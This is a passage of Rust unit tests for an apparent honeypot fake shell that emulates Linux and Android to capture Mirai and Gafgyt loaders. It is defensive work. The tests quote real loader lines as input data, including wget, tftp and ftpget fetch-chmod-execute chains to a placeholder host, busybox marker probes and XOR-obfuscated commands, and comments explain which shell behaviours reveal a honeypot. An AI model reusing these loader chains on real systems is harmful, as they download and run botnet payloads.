        assert_eq!(sh.handle_input("rm -f /tmp/payload").0, "");
        assert_eq!(
            sh.handle_input("rm /tmp/stage").0,
            "rm: cannot remove '/tmp/stage': Is a directory\n"
        );
        assert_eq!(sh.handle_input("rm -rf /tmp/stage").0, "");
        assert_eq!(
            sh.handle_input("cd /tmp/stage").0,
            "-bash: cd: /tmp/stage: No such file or directory\n"
        );
        // A baked-in file can be removed too: saying nothing and keeping it contradicts the rm.
        assert_eq!(sh.handle_input("rm /etc/hostname").0, "");
        assert_eq!(
            sh.handle_input("cat /etc/hostname").0,
            "cat: /etc/hostname: No such file or directory\n"
        );
    }

    /// A fetch that saves to a file leaves that file behind, so the `chmod` and `./payload` a
    /// loader runs next work; one that prints to stdout leaves nothing, as the real one does.
    #[test]
    fn a_saved_download_exists_afterwards_and_a_streamed_one_does_not() {
        let mut sh = shell();
        sh.handle_input("cd /tmp");
        sh.handle_input("wget http://198.51.100.9/bins/x86");
        assert_eq!(
            sh.handle_input("ls /tmp").0,
            "x86\n",
            "saved under its name"
        );
        assert_eq!(
            sh.handle_input("cat /tmp/x86").0,
            super::FETCHED_BODY,
            "the saved file holds the body the fetch claimed"
        );
        sh.handle_input("curl -o boot.sh http://198.51.100.9/boot");
        assert_eq!(sh.handle_input("ls /tmp").0, "boot.sh  x86\n");
        sh.handle_input("busybox tftp -g -r arm7 198.51.100.9");
        assert_eq!(sh.handle_input("ls /tmp").0, "arm7  boot.sh  x86\n");
        // Streamed to stdout (the `| sh` pattern): nothing is written.
        sh.handle_input("wget -qO- http://198.51.100.9/one");
        sh.handle_input("curl http://198.51.100.9/two");
        assert_eq!(sh.handle_input("ls /tmp").0, "arm7  boot.sh  x86\n");
    }

    /// Observed live (2026-09-06): `cat /proc/mounts; /bin/busybox URUMV`. The box answered
    /// "No such file or directory" for a file every Linux has.
    #[test]
    fn proc_mounts_is_readable_and_agrees_with_the_mount_command() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("cat /proc/mounts; /bin/busybox URUMV");
        assert!(
            out.contains("/dev/sda1 / ext4 rw,relatime,discard,errors=remount-ro 0 0\n"),
            "{out}"
        );
        assert!(out.ends_with("URUMV: applet not found\n"), "{out}");
        let (mount, _) = sh.handle_input("mount");
        assert!(
            mount.contains("/dev/sda1 on / type ext4 (rw,relatime,discard,errors=remount-ro)\n"),
            "{mount}"
        );
        assert_eq!(
            mount.lines().count(),
            out.lines().count() - 1,
            "mount lists exactly the table /proc/mounts exposes"
        );
        assert_eq!(
            sh.handle_input("cat /etc/mtab").0,
            sh.handle_input("cat /proc/self/mounts").0
        );
        assert_eq!(
            sh.handle_input("cd /sys/fs/cgroup").0,
            "",
            "a listed mount point is a directory"
        );
        assert_eq!(sh.handle_input("mount -t tmpfs tmpfs /mnt").0, "");
    }

    #[test]
    fn xor_obfuscated_command_is_decoded_dispatched_and_annotated() {
        let mut sh = shell();
        // The first obfuscated anchor ("enable" ^ 0x09) locks the session key.
        sh.handle_input(xor("enable", 0x09));
        // The obfuscated busybox probe now decodes and reaches the grammar.
        let probe_obf = xor("/bin/busybox LZRD", 0x09);
        let (out, events) = sh.handle_input(&probe_obf);
        assert!(
            out.contains("LZRD: applet not found"),
            "decoded probe must get the busybox applet reply, got {out:?}"
        );
        assert_eq!(events[0].metadata["command"], probe_obf); // raw bytes preserved verbatim
        assert_eq!(events[0].metadata["command_decoded"], "/bin/busybox LZRD");
        assert_eq!(events[0].metadata["xor_key"], 9);
    }

    #[test]
    fn plaintext_command_has_no_decoded_annotation() {
        let (_out, events) = shell().handle_input("uname -a");
        assert_eq!(events[0].metadata["command"], "uname -a");
        assert!(events[0].metadata.get("command_decoded").is_none());
        assert!(events[0].metadata.get("xor_key").is_none());
    }

    #[test]
    fn binary_flood_emits_one_marker_event_not_one_per_line() {
        // A channel streaming binary (an SSH IP produced >20k such "command" events) must not add
        // one ledger event per garbage line.
        let mut sh = shell();
        let garbage = "\u{FFFD}".repeat(40);

        let (_out, first) = sh.handle_input(&garbage);
        assert_eq!(
            first.len(),
            1,
            "the first binary line emits a single marker"
        );
        assert_eq!(first[0].metadata["flood"], "binary");

        let mut more = 0;
        for _ in 0..100 {
            more += sh.handle_input(&garbage).1.len();
        }
        assert_eq!(more, 0, "subsequent binary lines emit no further events");
    }

    #[test]
    fn command_flood_is_capped_to_one_marker_past_the_per_session_limit() {
        let cap = super::MAX_COMMANDS_PER_SESSION;
        let mut sh = shell();
        let mut total = 0;
        for i in 0..(cap + 50) {
            total += sh.handle_input(format!("cmd{i}")).1.len();
        }
        // `cap` real command events + exactly one cap marker; never one per line.
        assert_eq!(total, cap as usize + 1);
    }

    #[test]
    fn a_normal_fetch_command_still_emits_its_command_and_download_events() {
        let (_out, events) = shell().handle_input("wget http://198.51.100.9/x");
        assert_eq!(
            events.len(),
            2,
            "a fetch emits the command event + the download event"
        );
        assert!(events.iter().any(|e| e.metadata.get("url").is_some()));
    }

    #[test]
    fn encode_output_mirrors_after_a_command_locks_the_key() {
        let mut sh = shell();
        sh.handle_input(xor("enable", 0x09)); // an obfuscated command locks 0x09
        assert_eq!(sh.encode_output(b"# "), xor("# ", 0x09).into_bytes());
        // A plaintext session leaves output unchanged.
        let mut plain = shell();
        plain.handle_input("uname");
        assert_eq!(plain.encode_output(b"# "), b"# ".to_vec());
    }

    #[test]
    fn bin_busybox_path_form_gets_the_applet_reply() {
        // The full-path probe the LZRD variant sends must resolve like a bare `busybox` invocation.
        let (out, _) = shell().handle_input("/bin/busybox LZRD");
        assert!(out.contains("LZRD: applet not found"), "got {out:?}");
    }

    #[test]
    fn cat_proc_self_cmdline_returns_the_reading_process_argv() {
        // Every real Linux has /proc/self/cmdline; a "No such file or directory" is a honeypot tell
        // some Mirai/Gafgyt loaders check before delivering a payload. /proc/self is the `cat`
        // process, so it returns cat's own argv, NUL-separated with a trailing NUL and no newline.
        let (out, _) = shell().handle_input("cat /proc/self/cmdline");
        assert_eq!(out, "cat\0/proc/self/cmdline\0");
    }

    #[test]
    fn cd_proc_then_cat_relative_cmdline_resolves_against_cwd() {
        // The observed bot ran `cd /proc && cat self/cmdline`; the relative path must resolve.
        let mut sh = shell();
        sh.handle_input("cd /proc");
        let (out, _) = sh.handle_input("cat self/cmdline");
        assert_eq!(out, "cat\0self/cmdline\0");
    }

    #[test]
    fn cat_relative_file_resolves_against_cwd() {
        let mut sh = shell();
        sh.handle_input("cd /etc");
        let (out, _) = sh.handle_input("cat hostname");
        assert!(out.contains("server01"), "got: {out:?}");
    }

    #[test]
    fn sh_is_never_command_not_found() {
        // Every real system has /bin/sh; "command not found" would out the honeypot instantly.
        let (out, events) = shell().handle_input("sh");
        assert_eq!(out, "");
        assert_eq!(events.len(), 1); // command_exec only, no spurious download
    }

    /// Observed live 2026-09-06: a Mirai scanner sent `ls /home; /bin/busybox BOTNET` as ONE line.
    /// The shell dispatched the whole line as `ls` with `/home;` as its argument, answered
    /// "cannot access '/home;'", and the busybox probe never ran - so the loader never saw the
    /// "applet not found" reply it gates its download stage on, and left. A real shell runs each
    /// command in turn.
    #[test]
    fn semicolon_separated_commands_each_run_and_the_busybox_gate_still_answers() {
        let (out, events) = shell().handle_input("ls /home; /bin/busybox BOTNET");
        assert!(
            out.contains("ubuntu"),
            "ls /home must list the home dir: {out:?}"
        );
        assert!(
            out.ends_with("BOTNET: applet not found\n"),
            "the busybox probe after the `;` must run and answer: {out:?}"
        );
        assert!(!out.contains("cannot access"), "{out:?}");
        assert_eq!(
            events.len(),
            1,
            "still one command_exec event per input line"
        );
    }

    #[test]
    fn cd_then_pwd_on_one_line_sees_the_new_directory() {
        let (out, _) = shell().handle_input("cd /tmp; pwd");
        assert_eq!(out, "/tmp\n");
    }

    #[test]
    fn and_and_or_short_circuit_on_the_previous_outcome() {
        let (out, _) = shell().handle_input("nosuchcmd && echo ran");
        assert!(
            !out.contains("ran"),
            "&& after a failure must not run: {out:?}"
        );
        let (out, _) = shell().handle_input("nosuchcmd || echo fallback");
        assert!(
            out.ends_with("fallback\n"),
            "|| after a failure must run: {out:?}"
        );
        let (out, _) = shell().handle_input("id && echo ok");
        assert!(out.contains("uid=0") && out.ends_with("ok\n"), "{out:?}");
    }

    #[test]
    fn explicit_status_controls_lists_without_reading_output_words() {
        let (out, _) = shell().handle_input("echo not found && echo continued");
        assert_eq!(out, "not found\ncontinued\n");
        assert_eq!(out.status, 0);

        let (out, _) = shell().handle_input("false && echo skipped || echo fallback");
        assert_eq!(out, "fallback\n");
        assert_eq!(out.status, 0);

        let (out, _) = shell().handle_input("true || echo skipped");
        assert_eq!(out, "");
        assert_eq!(out.status, 0);
    }

    #[test]
    fn command_result_keeps_ordered_stdout_and_stderr_segments() {
        let (out, _) = shell().handle_input("nosuchcmd; echo recovered");
        assert_eq!(out.status, 0, "the final command decides the list status");
        assert_eq!(out.bytes(), b"nosuchcmd: command not found\nrecovered\n");
        assert_eq!(out.output.len(), 2);
        assert_eq!(out.output[0].fd, OutputFd::Stderr);
        assert_eq!(out.output[1].fd, OutputFd::Stdout);

        let (failed, _) = shell().handle_input("nosuchcmd");
        assert_eq!(failed.status, 127);
        assert_eq!(failed.output[0].fd, OutputFd::Stderr);
    }

    #[test]
    fn modeled_failures_carry_their_real_exit_statuses() {
        let mut sh = shell();
        let cases = [
            ("/bin/busybox ECCHI", 127),
            ("false", 1),
            ("nosuchcmd_q", 127),
            ("/tmp", 126),
            ("/tmp/missing_q", 127),
            ("cat /missing_q", 1),
            ("ls /missing_q", 2),
            ("cd /missing_q", 1),
            ("cp", 1),
            ("rm", 1),
            ("mkdir", 1),
            ("> /missing_q/x", 1),
        ];
        for (line, expected) in cases {
            let (out, _) = sh.handle_input(line);
            assert_eq!(out.status, expected, "{line}: {out:?}");
            if !out.is_empty() {
                assert_eq!(out.output[0].fd, OutputFd::Stderr, "{line}: {out:?}");
            }
        }

        assert_eq!(sh.handle_input(">/tmp/np").0.status, 0);
        assert_eq!(sh.handle_input("/tmp/np").0.status, 126);
        assert_eq!(sh.handle_input("mkdir /tmp/existing").0.status, 0);
        assert_eq!(sh.handle_input("mkdir /tmp/existing").0.status, 1);
    }

    #[test]
    fn onlcr_maps_newlines_without_decoding_bytes() {
        assert_eq!(onlcr(b"a\n\0\xffb\n"), b"a\r\n\0\xffb\r\n");
        assert_eq!(onlcr(b"\r\n"), b"\r\r\n");
    }

    #[test]
    fn a_pipeline_stays_one_command_answered_by_its_first_stage() {
        // `|` is not a control operator here: the left stage answers, as before this change.
        let (out, _) = shell().handle_input("id | grep uid");
        assert!(out.contains("uid=0(root)"), "{out:?}");
        assert!(!out.contains("grep"), "{out:?}");
    }

    /// Observed live 2026-09-06, verbatim: a loader probing for a writable directory before
    /// choosing a drop location, then printing the marker it keys its next stage on.
    #[test]
    fn writable_directory_probe_chain_reaches_the_busybox_marker() {
        let mut sh = shell();
        let (out, events) = sh.handle_input(
            ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
             >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
             /bin/busybox echo -e '\\x51\\x4a\\x4c\\x58\\x54\\x4b'",
        );
        assert_eq!(
            out, "QJLXTK\n",
            "every probe silent, then exactly the marker"
        );
        assert_eq!(sh.cwd, "/var", "the last successful `&& cd` wins");
        assert_eq!(events.len(), 1, "one command_exec for the line");
        assert_eq!(
            events[0].signal_type,
            sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC,
            "no download event: the line retrieves nothing"
        );
    }

    #[test]
    fn a_redirection_probe_into_a_missing_directory_fails_and_blocks_its_cd() {
        let mut sh = shell();
        let (out, _) = sh.handle_input(">/nonexistent/.x&&cd /nonexistent;pwd");
        assert_eq!(
            out, "-bash: /nonexistent/.x: No such file or directory\n/root\n",
            "{out:?}"
        );
        assert_eq!(sh.cwd, "/root");
    }

    #[test]
    fn a_created_file_shows_up_in_a_later_listing() {
        let mut sh = shell();
        sh.handle_input("cd /tmp; >.x");
        let (out, _) = sh.handle_input("ls -a /tmp");
        assert!(out.contains(".x"), "{out:?}");
    }

    #[test]
    fn cd_into_a_directory_the_box_does_not_present_is_refused() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("cd /nonexistent");
        assert_eq!(out, "-bash: cd: /nonexistent: No such file or directory\n");
        assert_eq!(sh.cwd, "/root");
        // Directories the root listing advertises, and ancestors of modeled files, still work.
        assert_eq!(sh.handle_input("cd /proc").0, "");
        assert_eq!(sh.handle_input("cd /bin").0, "");
    }

    /// A file made executable under a `noexec` mount is refused as the kernel refuses it, while
    /// the same steps in an exec-permitted directory run. `/var/run` is `/run` behind a symlink,
    /// so it is refused too.
    #[test]
    fn running_a_chmodded_file_from_a_noexec_mount_is_permission_denied() {
        let mut sh = shell();
        sh.handle_input(">/run/x; chmod +x /run/x");
        let (out, _) = sh.handle_input("/run/x");
        assert_eq!(out, "-bash: /run/x: Permission denied\n");
        assert_eq!(out.status, 126);
        assert_eq!(
            sh.handle_input("/var/run/x").0,
            "-bash: /var/run/x: Permission denied\n"
        );
        sh.handle_input(">/tmp/x; chmod +x /tmp/x");
        assert_eq!(sh.handle_input("/tmp/x").0, "", "/tmp permits exec");

        let mut android = FakeShell::android(
            FakeFs::android(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "adb".to_string(),
                session_id: None,
            },
        );
        android.handle_input(">/sdcard/x; chmod +x /sdcard/x");
        let (out, _) = android.handle_input("/sdcard/x");
        assert_eq!(out, "sh: /sdcard/x: Permission denied\n");
        assert_eq!(out.status, 126);
        android.handle_input(">/data/local/tmp/x; chmod +x /data/local/tmp/x");
        assert_eq!(android.handle_input("/data/local/tmp/x").0, "");
    }

    /// `cat` of a directory says so; it used to claim the directory did not exist.
    #[test]
    fn cat_of_a_directory_says_it_is_a_directory() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("cat /etc");
        assert_eq!(out, "cat: /etc: Is a directory\n");
        assert_eq!(out.status, 1);
        assert_eq!(
            sh.handle_input("cat /nonexistent").0,
            "cat: /nonexistent: No such file or directory\n"
        );
        assert_eq!(
            sh.handle_input("cat /bin").0,
            "cat: /bin: Is a directory\n",
            "a symlink to a directory is a directory"
        );
    }

    /// `cd` through a symlink keeps the logical path in `pwd` and the prompt, as bash does, while
    /// files resolve physically.
    #[test]
    fn cd_through_a_symlink_keeps_the_logical_cwd() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("cd /var/run").0, "");
        assert_eq!(sh.handle_input("pwd").0, "/var/run\n");
        assert_eq!(sh.handle_input(">.x").0, "");
        assert_eq!(sh.handle_input("ls -a /run").0, ".x  lock  user\n");
        assert_eq!(sh.handle_input("cd /bin").0, "");
        assert_eq!(sh.handle_input("pwd").0, "/bin\n");
        assert_eq!(
            sh.handle_input("cat busybox").0.bytes(),
            b"\x7fELF\x02\x01\x01\0"
        );
    }

    #[test]
    fn su_on_a_root_shell_is_silent() {
        assert_eq!(shell().handle_input("su").0, "");
        assert_eq!(shell().handle_input("su -").0, "");
        assert_eq!(shell().handle_input("su root").0, "");
    }

    #[test]
    fn background_ampersand_and_newline_also_separate_commands() {
        let (out, _) = shell().handle_input("cd /etc & pwd\nwhoami");
        assert!(out.ends_with("/etc\nroot\n"), "{out:?}");
    }

    #[test]
    fn mirai_busybox_probe_returns_applet_not_found() {
        // `/bin/busybox <TOKEN>` is Mirai/Gafgyt's real-shell check; they require the exact
        // "<TOKEN>: applet not found" reply before delivering a payload.
        let (out, _) = shell().handle_input("busybox MIRAI");
        assert_eq!(out, "MIRAI: applet not found\n");
    }

    #[test]
    fn busybox_echo_still_passes_the_gafgyt_handshake() {
        let (out, _) = shell().handle_input("busybox echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"");
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn sh_dash_c_runs_the_inner_command() {
        let (out, _) = shell().handle_input("sh -c \"id\"");
        assert!(out.contains("uid=0(root)"), "got: {out}");
    }

    #[test]
    fn busybox_wget_is_captured_as_a_download() {
        let (_, events) = shell().handle_input("busybox wget http://198.51.100.9/bins/x86");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("busybox wget must emit a file_download event");
        assert_eq!(dl.metadata["url"], "http://198.51.100.9/bins/x86");
    }

    #[test]
    fn download_target_recognizes_direct_and_busybox_forms() {
        assert_eq!(
            download_target(&["wget", "http://x/y"]).as_deref(),
            Some("http://x/y")
        );
        // Previously asserted `Some("x")` - the FILENAME - which was the defect: a scheme-less
        // fragment the fetcher cannot parse. The host and file are separate tokens; the url is
        // synthesized from both.
        assert_eq!(
            download_target(&["busybox", "tftp", "-g", "-r", "x", "10.0.0.1"]).as_deref(),
            Some("tftp://10.0.0.1/x")
        );
        assert_eq!(download_target(&["busybox", "MIRAI"]), None);
        assert_eq!(download_target(&["ls", "-la"]), None);
    }

    #[test]
    fn download_target_captures_full_path_fetch_forms() {
        // Loaders routinely invoke fetchers by absolute path; `download_target` must resolve the
        // basename like `dispatch` does, or the `honeypot_file_download` evidence is silently lost
        // for these while the shell still answers them in-persona. Scheme-less tftp is the case the
        // `url_if_fetch_line` URL-scheme fallback cannot rescue.
        assert_eq!(
            download_target(&[
                "/bin/busybox",
                "tftp",
                "-g",
                "-r",
                "payload.arm",
                "198.51.100.9"
            ])
            .as_deref(),
            Some("tftp://198.51.100.9/payload.arm")
        );
        assert_eq!(
            download_target(&["/usr/bin/wget", "http://198.51.100.9/x"]).as_deref(),
            Some("http://198.51.100.9/x")
        );
        // The busybox APPLET token is matched raw, like cmd_busybox: `busybox /bin/tftp` is
        // "applet not found" to the persona, so it must not be recorded as a fetch.
        assert_eq!(
            download_target(&["busybox", "/bin/tftp", "-g", "-r", "x", "10.0.0.1"]),
            None
        );
    }

    // The exact retrieval lines a live Mirai loader ran against the telnet sensor (documentation
    // address in place of the real payload host). Both had been recorded as the bare host with no
    // scheme, so the fetcher never queued either.
    #[test]
    fn download_target_synthesizes_urls_for_bare_tftp_and_ftpget() {
        // `-g HOST -r FILE`: host before the -r operand.
        assert_eq!(
            download_target(&["tftp", "-g", "198.51.100.9", "-r", "tftp"]).as_deref(),
            Some("tftp://198.51.100.9/tftp")
        );
        // `ftpget HOST LOCAL REMOTE`: the remote name is the last positional.
        assert_eq!(
            download_target(&["ftpget", "198.51.100.9", "f", "ftpget"]).as_deref(),
            Some("ftp://198.51.100.9/ftpget")
        );
        // `ftpget HOST REMOTE` (local name defaulted).
        assert_eq!(
            download_target(&["ftpget", "198.51.100.9", "bin.arm"]).as_deref(),
            Some("ftp://198.51.100.9/bin.arm")
        );
        // Explicit ports, both syntaxes.
        assert_eq!(
            download_target(&["tftp", "-g", "-r", "x", "198.51.100.9", "6969"]).as_deref(),
            Some("tftp://198.51.100.9:6969/x")
        );
        assert_eq!(
            download_target(&["ftpget", "-P", "2121", "198.51.100.9", "x"]).as_deref(),
            Some("ftp://198.51.100.9:2121/x")
        );
        // `-l` alone names the remote file too (BusyBox behaviour); `-u`/`-p` operands are skipped,
        // never mistaken for the host.
        assert_eq!(
            download_target(&["tftp", "-g", "-l", "local.bin", "198.51.100.9"]).as_deref(),
            Some("tftp://198.51.100.9/local.bin")
        );
        assert_eq!(
            download_target(&["ftpget", "-u", "anon", "-p", "x", "198.51.100.9", "f"]).as_deref(),
            Some("ftp://198.51.100.9/f")
        );
        // A host with no file is still evidence; no host at all is not a fetch.
        assert_eq!(
            download_target(&["tftp", "-g", "198.51.100.9"]).as_deref(),
            Some("tftp://198.51.100.9")
        );
        assert_eq!(download_target(&["tftp", "-g", "-r", "x"]), None);
    }

    /// A loader line seen live 2026-09-03 (host replaced): the output file is named BEFORE the
    /// url, and the whole thing is a `cd` chain with the fetchers in a subshell. It was recorded
    /// as a download of `1.sh`, a bare filename the fetcher could not retrieve.
    #[test]
    fn output_file_named_before_the_url_is_not_mistaken_for_the_url() {
        let line = "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.51.100.9:80/1.sh||busybox wget -q -O 1.sh http://198.51.100.9:80/1.sh||curl -so 1.sh http://198.51.100.9:80/1.sh)&&chmod 777 1.sh&&sh 1.sh;echo ok";
        let (_out, events) = shell().handle_input(line);
        let urls: Vec<_> = events
            .iter()
            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
            .collect();
        assert_eq!(urls, vec!["http://198.51.100.9:80/1.sh"]);

        // Schemeless forms still resolve by position, with option values skipped either way.
        assert_eq!(
            download_target(&["wget", "-q", "-O", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh")
        );
        assert_eq!(
            download_target(&["wget", "-qO", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh"),
            "a cluster ending in a value-taking letter consumes the next token"
        );
        assert_eq!(
            download_target(&["wget", "-qO-", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh"),
            "an attached value (`-qO-`) must not consume the url"
        );
        assert_eq!(
            download_target(&["curl", "-so", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh")
        );
        assert_eq!(
            download_target(&["curl", "--output", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh")
        );
    }

    /// The three retrieval lines a live Mirai loader sent (2026-09-02), verbatim except the host.
    /// Each fetcher is wrapped in a `( a || busybox a ) > f; ...` fallback chain, so the fetch verb
    /// is never the line's first token. The wget line was captured on the box; tftp and ftpget
    /// were not, because their URLs have no scheme for the raw-line scan to find.
    #[test]
    fn mirai_fallback_chains_emit_a_download_event_for_every_fetcher() {
        let cases = [
            (
                "(wget http://198.51.100.9/wget -O- || busybox wget http://198.51.100.9/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
                "http://198.51.100.9/wget",
            ),
            (
                "(tftp -g 198.51.100.9 -r tftp -l- || busybox tftp -g 198.51.100.9 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
                "tftp://198.51.100.9/tftp",
            ),
            (
                "(ftpget 198.51.100.9 f ftpget || busybox ftpget 198.51.100.9 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
                "ftp://198.51.100.9/ftpget",
            ),
        ];
        for (line, url) in cases {
            let (_out, events) = shell().handle_input(line);
            let dls: Vec<_> = events
                .iter()
                .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
                .collect();
            assert_eq!(dls.len(), 1, "exactly one download event for: {line}");
            assert_eq!(dls[0].metadata["url"], url, "line: {line}");
        }
    }

    #[test]
    fn simple_commands_split_at_separators_and_stop_at_redirections() {
        assert_eq!(
            simple_commands(
                "(tftp -g h -r x -l- || busybox tftp -g h) > t; chmod 777 t && ./t 2>&1"
            ),
            vec![
                vec!["tftp", "-g", "h", "-r", "x", "-l-"],
                vec!["busybox", "tftp", "-g", "h"],
                vec!["chmod", "777", "t"],
                vec!["./t"],
            ]
        );
        // A `&` inside a query string is part of the URL, not a background operator.
        assert_eq!(
            simple_commands("wget http://h/x?a=1&b=2 -O- & sleep 1"),
            vec![
                vec!["wget", "http://h/x?a=1&b=2", "-O-"],
                vec!["sleep", "1"]
            ]
        );
    }

    #[test]
    fn a_line_fetching_two_different_urls_emits_two_download_events() {
        let (_out, events) = shell().handle_input(
            "wget http://198.51.100.9/a; tftp -g 198.51.100.9 -r b; wget http://198.51.100.9/a",
        );
        let urls: Vec<_> = events
            .iter()
            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
            .collect();
        assert_eq!(
            urls,
            vec!["http://198.51.100.9/a", "tftp://198.51.100.9/b"],
            "one event per distinct URL, in first-seen order"
        );
    }

    #[test]
    fn a_bare_tftp_line_emits_a_download_event_with_a_real_url() {
        let (_out, events) = shell().handle_input("tftp -g 198.51.100.9 -r tftp");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("a bare tftp fetch must emit a download event");
        assert_eq!(dl.metadata["url"], "tftp://198.51.100.9/tftp");
    }

    #[test]
    fn busybox_applet_set() {
        assert!(is_busybox_applet("wget"));
        assert!(is_busybox_applet("sh"));
        assert!(!is_busybox_applet("MIRAI"));
    }

    fn noon() -> chrono::DateTime<chrono::Utc> {
        "2026-09-29T12:00:00Z".parse().unwrap()
    }

    #[test]
    fn the_session_clock_stamps_replies_and_events() {
        let mut sh = shell().with_clock(noon);
        let (out, events) = sh.handle_input("wget http://198.51.100.9/x");
        assert!(
            out.starts_with("--2026-09-29 12:00:00--  http://198.51.100.9/x\n"),
            "{out}"
        );
        assert!(
            out.contains("\n2026-09-29 12:00:00 (1.2 MB/s) - 'x' saved"),
            "{out}"
        );
        assert_eq!(events.len(), 2, "{events:?}");
        assert!(events.iter().all(|e| e.observed_at == noon()));
    }

    #[test]
    fn wget_derives_the_saved_filename_from_the_url() {
        let out = cmd_wget(&["wget", "http://198.51.100.9/bins/mips"], noon());
        assert!(out.contains("Saving to: 'mips'"), "got: {out}");
        assert!(
            !out.contains("index.html"),
            "constant filename tell remains: {out}"
        );
    }

    #[test]
    fn wget_quiet_suppresses_the_banner() {
        assert_eq!(cmd_wget(&["wget", "-q", "http://x/y"], noon()), "");
    }

    #[test]
    fn wget_dash_big_o_dash_writes_body_to_stdout() {
        // The `wget -qO- URL | sh` loader pattern: content goes to stdout, not a transcript.
        let out = cmd_wget(&["wget", "-qO-", "http://x/y"], noon());
        assert!(out.contains("It works!"), "got: {out}");
    }

    #[test]
    fn curl_dash_big_o_is_silent_on_stdout() {
        // A real `curl -O URL` writes a file and prints nothing to stdout - the old code printed the
        // body, a clean one-probe tell.
        assert_eq!(cmd_curl(&["curl", "-O", "http://x/y"]), "");
        assert_eq!(cmd_curl(&["curl", "-o", "out", "http://x/y"]), "");
        // Without -o/-O, curl prints the body to stdout.
        assert!(cmd_curl(&["curl", "http://x/y"]).contains("It works!"));
    }

    #[test]
    fn ping_is_not_command_not_found() {
        let (out, _) = shell().handle_input("ping 8.8.8.8");
        assert!(out.contains("ping statistics"), "got: {out}");
        assert!(!out.contains("command not found"), "got: {out}");
    }

    #[test]
    fn sh_dash_c_wget_chain_is_captured_as_a_download() {
        let (_, events) =
            shell().handle_input("sh -c \"wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh\"");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("a wget URL inside sh -c must still be captured");
        assert_eq!(dl.metadata["url"], "http://198.51.100.9/x.sh");
    }

    #[test]
    fn url_scan_only_fires_with_a_fetch_verb() {
        assert_eq!(
            url_if_fetch_line("wget http://a/b"),
            Some("http://a/b"),
            "fetch verb + url should capture"
        );
        assert_eq!(
            url_if_fetch_line("echo http://a/b"),
            None,
            "a bare echo of a url is not a download"
        );
    }

    #[test]
    fn uname_m_returns_only_the_machine_field() {
        // The #1 IoT-loader recon command: `uname -m` must print exactly the arch, not the whole
        // `uname -a` line (the old shortcut returned uname_all for any flag - a one-probe tell that
        // also broke arch-based payload selection).
        assert_eq!(
            cmd_uname(&["uname", "-m"], crate::shell::ShellFlavor::Bash),
            "x86_64\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-p"], crate::shell::ShellFlavor::Bash),
            "x86_64\n"
        );
    }

    #[test]
    fn uname_single_fields_are_selected_individually() {
        assert_eq!(
            cmd_uname(&["uname", "-s"], crate::shell::ShellFlavor::Bash),
            "Linux\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-r"], crate::shell::ShellFlavor::Bash),
            "5.15.0-91-generic\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-n"], crate::shell::ShellFlavor::Bash),
            "server01\n"
        );
    }

    #[test]
    fn uname_combined_flags_print_fields_in_canonical_order() {
        // Multiple flags print the selected fields in coreutils' fixed order regardless of the flag
        // order given.
        assert_eq!(
            cmd_uname(&["uname", "-sr"], crate::shell::ShellFlavor::Bash),
            "Linux 5.15.0-91-generic\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-rs"], crate::shell::ShellFlavor::Bash),
            "Linux 5.15.0-91-generic\n"
        );
        assert_eq!(
            cmd_uname(&["uname", "-s", "-r"], crate::shell::ShellFlavor::Bash),
            "Linux 5.15.0-91-generic\n"
        );
    }

    #[test]
    fn uname_a_and_bare_keep_their_historical_output() {
        // Regression guard: the forms that were already correct must not change.
        assert_eq!(
            cmd_uname(&["uname", "-a"], crate::shell::ShellFlavor::Bash),
            "Linux server01 5.15.0-91-generic #101-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux\n"
        );
        assert_eq!(
            cmd_uname(&["uname"], crate::shell::ShellFlavor::Bash),
            "Linux\n"
        );
    }

    #[test]
    fn chmod_and_drop_chain_verbs_never_say_command_not_found() {
        // `chmod +x x` returning "command not found" is impossible on real Linux and aborts the
        // loader before it runs its payload - the most direct capture-costing tell in the shell.
        let (out, _) = shell().handle_input("chmod +x /tmp/x");
        assert_eq!(out, "");
        // The rest answer as the real commands do: silence on success, the real message on a
        // path that is not there. They used to be silent either way, which is how a loader
        // could `cp` a payload and then not find it.
        for cmd in ["cp /bin/busybox b", "mkdir d", "sleep 1", "rm -f x"] {
            let (o, _) = shell().handle_input(cmd);
            assert_eq!(o, "", "{cmd} should be a silent success, got {o:?}");
        }
        for (cmd, expected) in [
